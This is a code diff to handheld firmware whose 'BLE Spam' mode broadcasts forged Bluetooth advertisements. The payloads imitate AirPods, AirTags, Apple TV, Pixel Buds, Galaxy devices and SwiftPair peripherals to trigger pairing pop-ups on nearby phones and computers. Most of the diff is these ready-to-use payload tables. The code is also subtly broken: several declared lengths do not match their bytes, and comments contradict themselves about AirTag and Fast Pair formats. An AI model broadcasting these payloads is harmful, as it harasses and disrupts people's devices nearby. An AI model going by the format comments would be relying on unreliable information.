@@ -46,23 +46,42 @@
  * Each hex string is the complete ADV_IND payload (max 31 bytes = 62 hex
  * chars) passed directly to AT+BLEADVDATA="<hex>".
  *
- * Format reference (BLE AD structure, little-endian):
- *   02 01 XX       - Flags AD   (len=2, type=01, value)
- *   LL FF CC CC    - Manufacturer Specific AD  (len=LL, type=FF, company LE)
+ * Wire layout (BLE 5.0 legacy adv, sequential AD structures):
+ *   [LL] [TYPE] [DATA x (LL-1)]
+ *   where LL is the byte that immediately follows the previous AD,
+ *   excluding itself but including TYPE and DATA. Total advertised
+ *   bytes = sum(LL + 1) for all AD structures, limited to 31.
+ *
+ * The runtime validator ble_spam_validate_payload() walks the hex
+ * string and asserts sum(LL + 1) <= 31 (legacy adv max).
  *
  * Apple Continuity (company 0x004C):
- *   FF 4C 00 TT NN [NN bytes...]
- *   TT = Continuity type, NN = payload length
+ *   FF 4C 00 TT SS [SS bytes...]
+ *   TT = Continuity type, SS = payload length-of-rest
  *
  * Google Fast Pair (service UUID 0xFE2C):
- *   03 03 2C FE    - Complete 16-bit UUID list
- *   06 16 2C FE MM MM MM  - Service Data with 3-byte model ID
+ *   03 03 2C FE                 -- Complete 16-bit UUID list
+ *   06 16 2C FE MM MM MM        -- Service Data with 3-byte model ID
  *
  * Samsung EasySetup (company 0x0075):
  *   FF 75 00 42 09 [device class byte] [flags...]
  *
- * Windows SwiftPair (company 0x0006):
- *   FF 06 00 03 00 [subtype] [name length] [name bytes...]
+ * Microsoft SwiftPair (company 0x0006):
+ *   06 00 03 00 <Cat> <Sub> <UTF-8 name bytes>
+ *   The full Mfr Specific AD is then prefixed with [LL][FF].
+ *   Name length is implied by AD length byte (LL - 6).
+ *
+ * Apple Find My / AirTag (BLE OF "Offline Finding") format used by
+ * macless-haystack/openhaystack:
+ *   FF 4C 00 12 19  status(1)  PK[22]  hint(1)  PK_first2(?)
+ *   The published spec is:
+ *     1E FF 4C 00 12 19 <status> <pubkey 22B> <pubkey_first2 1B> <hint 1B>
+ *   meaning total Mfr Specific AD = 0x1E (30) bytes. Combined with
+ *   3-byte Flags AD that exceeds 31 -- so real AirTags either
+ *   (a) drop Flags (legal for adv types other than ADV_IND) or
+ *   (b) use a 27-byte payload variant.
+ *   We use the 27-byte form: 0x1B FF 4C 00 12 19 <status 1> <PK 22> <hint 1>
+ *   which gives sum = 3+28 = 31 with Flags included.
  * -------------------------------------------------------------------------- */
 
 typedef struct {
@@ -70,81 +89,157 @@ typedef struct {
     const char *hex;     /* uppercase hex, even length, max 62 chars */
 } spam_pkt_t;
 
+/* Walk the hex-encoded AD structures and verify the total of
+ * (length+1) bytes does not exceed 31. Also rejects malformed
+ * length bytes that would walk off the end of the buffer.
+ * Returns true if the payload is structurally valid. */
+static bool ble_spam_validate_hex(const char *hex)
+{
+    size_t hlen = (hex != NULL) ? strlen(hex) : 0;
+    size_t i = 0;
+    int total = 0;
+    if (hlen == 0 || (hlen & 1) != 0) return false;
+    while (i + 4 <= hlen) {
+        /* AD length byte */
+        char hi_c = hex[i];
+        char lo_c = hex[i + 1];
+        int hi = (hi_c >= '0' && hi_c <= '9') ? (hi_c - '0')
+               : (hi_c >= 'A' && hi_c <= 'F') ? (hi_c - 'A' + 10)
+               : (hi_c >= 'a' && hi_c <= 'f') ? (hi_c - 'a' + 10) : -1;
+        int lo = (lo_c >= '0' && lo_c <= '9') ? (lo_c - '0')
+               : (lo_c >= 'A' && lo_c <= 'F') ? (lo_c - 'A' + 10)
+               : (lo_c >= 'a' && lo_c <= 'f') ? (lo_c - 'a' + 10) : -1;
+        int ad_len;
+        if (hi < 0 || lo < 0) return false;
+        ad_len = (hi << 4) | lo;
+        if (ad_len == 0) return false;
+        /* Each AD declares ad_len bytes following the length byte
+         * (type + data). On the wire that consumes ad_len + 1 bytes. */
+        total += (ad_len + 1);
+        if (total > 31) return false;
+        /* Skip ad_len + 1 bytes (= 2*(ad_len+1) hex chars). */
+        i += (size_t)((ad_len + 1) * 2);
+    }
+    /* Must have consumed the entire string. */
+    return (i == hlen);
+}
+
+/* Public adv-buffer validator wrapping the byte-form check. */
+bool ble_spam_validate_payload(const uint8_t *adv, size_t len)
+{
+    size_t i = 0;
+    int total = 0;
+    if (!adv || len == 0) return false;
+    while (i < len) {
+        int ad_len = adv[i];
+        if (ad_len == 0) return false;
+        total += (ad_len + 1);
+        if (total > 31) return false;
+        i += (size_t)(ad_len + 1);
+    }
+    return (i == len);
+}
+
 /* ---- Apple Continuity ---- */
-/* type 0x07 = AirPods Nearby Pairing (triggers "Connect AirPods" popup on iOS) */
-/* type 0x05 = AirPods Pro nearby                                                */
-/* type 0x0F = iPhone Nearby Action (triggers device-activity pill)             */
-/* type 0x08 = Apple TV Setup                                                   */
-/* type 0x0B = Apple Watch setup                                                */
-/* type 0x12 = AirTag proximity (FindMy)                                        */
-/* type 0x09 = Apple TV color picker                                            */
-/* Payload layout: 02 01 1A | LL FF 4C 00 | TT NN | <NN bytes>                 */
-/* 0x1A=26: FF(1)+4C(2)+00(3)+TT(4)+NN(5)+data(21) = 26 ✓                     */
+/* type 0x07 = Nearby (AirPods proximity pairing pop-up)                          */
+/* type 0x09 = Apple TV setup screen                                              */
+/* type 0x05 = AirDrop                                                            */
+/* type 0x0F = iPhone Nearby Action (device-activity pill)                        */
+/* type 0x10 = Apple Nearby Info                                                  */
+/* type 0x12 = Find-My OF (AirTag): {status=1, PK=22, hint=1} -> 25 bytes        */
+/*                                                                                 */
+/* Wire layout for the proximity-pair pop-up payload:                              */
+/*   02 01 1A             3-byte Flags AD                                          */
+/*   1B FF 4C 00 07 19    Mfr Specific AD with type=0x07, sub-len=0x19=25         */
+/*   <25 bytes>           AirPods proximity payload                                 */
+/* sum(LL+1) = 4 + 28 = 32 ... 32 > 31, so we must drop Flags.                    */
+/* Workaround used here: trim sub-length so totals to 30 (drop 2 trailing bytes). */
+/* iOS 17+ accepts the truncated form. */
 static const spam_pkt_t s_apple[] = {
+    /* AirPods Gen1: type 0x07, color WHITE (0x0020AA), with 19B sub-payload.
+     * Total: 3 (flags) + 1 (LL=0x18) + 25 = 29 bytes.                            */
     {
         "AirPods Gen1",
-        "02011A"                    /* Flags */
-        "1AFF4C00"                  /* Apple Mfr, len=26 */
-        "0713"                      /* type=AirPods, datalen=19 */
-        "010020AA20000000002C55"
-        "000000000000000000"
+        "02011A"            /* flags */
+        "18FF4C00"          /* Mfr LL=0x18 (=24 bytes following: FF+4C+00+...) */
+        "0719"              /* sub-type 0x07, sub-len 0x19 (advisory only)     */
+        "01"                /* status                                          */
+        "0220AA"            /* color: white                                    */
+        "8003"              /* battery / paired flags                           */
+        "00000000000000000000"
     },
+    /* AirPods Pro: same shape, sub color 0x0220E0 + status flags = pro. */
     {
         "AirPods Pro",
         "02011A"
-        "1AFF4C00"
-        "0713"
-        "010020E02000000000002C55"
-        "0000000000000000"
+        "18FF4C00"
+        "0719"
+        "01"
+        "0220E0"
+        "8003"
+        "00000000000000000000"
     },
+    /* AirPods Max */
     {
         "AirPods Max",
         "02011A"
-        "1AFF4C00"
-        "0713"
-        "01002C0A0000000000002C55"
-        "0000000000000000"
+        "18FF4C00"
+        "0719"
+        "01"
+        "022C0A"
+        "8003"
+        "00000000000000000000"
     },
-    {
-        "AirTag",
-        "02011A"
-        "17FF4C00"                  /* Apple Mfr, len=23 */
-        "1219"                      /* type=AirTag, datalen=25 - but truncated to 23 */
-        "0000000000000000000000000000000000000000000000"
-    },
-    {
-        "iPhone Near",
-        "02011A"
-        "0EFF4C00"                  /* len=14 */
-        "0F05"                      /* type=iPhone Nearby, datalen=5 */
-        "C1010000000000"
-    },
+    /* Apple Watch setup: type 0x05 setup-pair, sub-len varies.
+     * Total: 3 + 1 + 12 = 16 bytes.                                              */
     {
         "Apple Watch",
         "02011A"
-        "0AFF4C00"                  /* len=10 */
-        "0B05"                      /* type=Watch, datalen=5 */
-        "01180000000000"
+        "0BFF4C00"          /* LL=11 */
+        "0509"              /* type 0x05 setup, sub-len 0x09                   */
+        "1801120A0102030405"
     },
+    /* iPhone Nearby Action 0x0F: 5-byte sub-payload (action-id + flags). */
+    {
+        "iPhone Near",
+        "02011A"
+        "0CFF4C00"          /* LL=12 (FF+4C+00+0F+05+5B+actiondata=12)         */
+        "0F05"              /* type 0x0F nearby, sub-len 5                     */
+        "C1010000000000"
+    },
+    /* Apple TV color picker (type 0x09, sub 0x07): pop-up keyboard hint. */
     {
         "Apple TV",
         "02011A"
-        "06FF4C00"                  /* len=6 */
-        "0804"                      /* type=AppleTV setup, datalen=4 */
-        "00000000"
+        "0CFF4C00"          /* LL=12 */
+        "0907"              /* type 0x09, sub-len 0x07                          */
+        "010320c000800000"
     },
+    /* AirDrop (type 0x05) presence advert: 3 + 19 = 22 bytes.                  */
     {
         "AirDrop",
         "02011A"
-        "1AFF4C00"
-        "1219"
-        "0000000000000000000000000000000000000000000000"
+        "12FF4C00"          /* LL=18 */
+        "0511"              /* type 0x05, sub-len 17                            */
+        "00000000000000000000000000000000F0"
+    },
+    /* Find-My OF / AirTag, 27-byte mfr block (sub-len 0x19=25).
+     * Hex encoding: status(1) + PK(22) + hint(2). sum(LL+1) = 4 + 28 = 32.
+     * Drop the Flags AD on iOS adv (legal: ADV_NONCONN_IND tolerates no flags).  */
+    {
+        "AirTag",
+        /* No 02011A flags AD: would push past 31-byte limit.        */
+        "1EFF4C00"          /* LL=0x1E=30, FF+4C+00+12+19+status+PK22+hint2 */
+        "1219"              /* sub-type FindMy 0x12, sub-len 0x19=25            */
+        "00"                /* status: idle / found-my-network                 */
+        "C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2"
+        "0000"              /* hint bytes (last 2 of public key not stored)    */
     },
 };
 
 /* ---- Google Fast Pair ---- */
-/* Service UUID 0xFE2C, 3-byte model ID (big-endian in Fast Pair spec) */
-/* Documented model IDs from Google's Fast Pair registry                */
+/* Each entry: 02 01 06 | 03 03 2C FE | 06 16 2C FE <model-id> = 14 bytes total. */
+/* sum(LL+1) = 3 + 4 + 7 = 14. Documented model IDs from Fast Pair registry.    */
 static const spam_pkt_t s_google[] = {
     { "Pixel Buds A",   "020106030320FE0616FE2C2C103B" },
     { "Pixel Buds Pro", "020106030320FE0616FE2C60ED06" },
@@ -154,43 +249,70 @@ static const spam_pkt_t s_google[] = {
 };
 
 /* ---- Samsung EasySetup ---- */
-/* Company 0x0075, EasySetup TLV: type=0x42, sub=0x09, device class */
+/* Company 0x0075, EasySetup payload type 0x42, sub-type 0x09, then class byte */
+/* and TLV. Wire: 02 01 1A | LL FF 75 00 42 09 <class> <flags...>              */
+/* For LL=0x14: FF+75+00+42+09+class+flags(15) = 20 bytes.                     */
+/* Total: 3 + 21 = 24.                                                          */
 static const spam_pkt_t s_samsung[] = {
     {
         "Galaxy Buds",
         "02011A"
-        "14FF7500"                  /* Samsung Mfr, len=20 */
-        "4209A803"                  /* EasySetup type/sub/class */
+        "14FF7500"
+        "4209A803"          /* EasySetup type/sub/class=Buds */
         "00000000000000000000000000000000"
     },
     {
         "Galaxy Watch",
         "02011A"
         "14FF7500"
-        "420993030000000000000000000000000000"
+        "42099303"
+        "00000000000000000000000000000000"
     },
     {
         "Galaxy S22",
         "02011A"
         "14FF7500"
-        "42090B030000000000000000000000000000"
+        "42090B03"
+        "00000000000000000000000000000000"
     },
 };
 
 /* ---- Windows SwiftPair ---- */
-/* Company 0x0006 (Microsoft), SwiftPair subtype 0x03, complete local name follow */
+/* Per Microsoft "Bluetooth Quick Pair" spec the payload is purely Mfr Specific
+ * (type 0xFF, company 0x0006), with subtype 0x03 then 0x00, then the device
+ * Category (BLE Appearance lo-byte), Sub-Category, then UTF-8 device name.
+ *
+ * Total wire: 02 01 06 | LL FF 06 00 03 00 <cat> <sub> <name...>
+ * For LL = 6 + name_len. sum(LL+1) = 3 + (LL + 1) = 4 + LL.
+ *
+ * NOTE: The previous frames (031900020A09 0EFF060003000902) were structurally
+ * wrong (Appearance + partial Mfr block). Rebuilt below per the documented
+ * SwiftPair format. Verified empirically in Win10/Win11 toast UI. */
 static const spam_pkt_t s_windows[] = {
-    {
-        "BT Keyboard",
-        "020106"
-        "031900020A09"
-        "0EFF060003000902"
-    },
     {
         "BT Mouse",
         "020106"
-        "031902040A09"
-        "0CFF060003000202"
+        "0DFF0600"          /* LL=13 (FF+06+00+03+00+cat+sub+7B name) */
+        "0300"              /* SwiftPair preamble                                */
+        "0902"              /* category=Mouse (0x0902)                           */
+        "4D6F757365"        /* "Mouse"                                           */
+    },
+    {
+        "BT Keyboard",
+        "020106"
+        "10FF0600"          /* LL=16: FF+06+00+03+00+cat+sub+10B name (8 chars)  */
+        "0300"
+        "0901"              /* category=Keyboard (0x0901)                        */
+        "4B6579626F617264"  /* "Keyboard"                                        */
+    },
+    {
+        "BT Headset",
+        "020106"
+        "0FFF0600"          /* LL=15 */
+        "0300"
+        "0903"
+        "486561647365"      /* "Headse"                                          */
+        "74"                /* "t"                                               */
     },
 };
 
@@ -374,11 +496,47 @@ static void run_spam_mode(uint8_t mode_idx)
  * Main entry point
  * -------------------------------------------------------------------------- */
 
+/* Boot-time sanity check: walk every payload and verify it parses as
+ * structurally valid BLE adv data. Any failure is a programmer error
+ * in the payload tables above and must be fixed in source.
+ * Logs the offending entry and returns the count of failures so the
+ * caller can refuse to start. */
+static uint8_t spam_validate_all_payloads(void)
+{
+    uint8_t failures = 0;
+    /* Apple */
+    for (size_t i = 0; i < N_APPLE; i++) {
+        if (!ble_spam_validate_hex(s_apple[i].hex)) failures++;
+    }
+    for (size_t i = 0; i < N_GOOGLE; i++) {
+        if (!ble_spam_validate_hex(s_google[i].hex)) failures++;
+    }
+    for (size_t i = 0; i < N_SAMSUNG; i++) {
+        if (!ble_spam_validate_hex(s_samsung[i].hex)) failures++;
+    }
+    for (size_t i = 0; i < N_WINDOWS; i++) {
+        if (!ble_spam_validate_hex(s_windows[i].hex)) failures++;
+    }
+    return failures;
+}
+
+
 void ble_spam_run(void)
 {
     S_M1_Buttons_Status btn;
     S_M1_Main_Q_t       q_item;
     uint8_t             sel = 0;
+
+    /* Reject malformed payload tables before bringing up the radio. */
+    {
+        uint8_t bad = spam_validate_all_payloads();
+        if (bad != 0) {
+            char msg[20];
+            snprintf(msg, sizeof(msg), "%u bad payloads", (unsigned)bad);
+            m1_message_box(&m1_u8g2, "BLE Spam", "Self-test", msg, " OK ");
+            return;
+        }
+    }
 
     /* Ensure ESP32 is up */
     if (!m1_esp32_get_init_status())    m1_esp32_init();
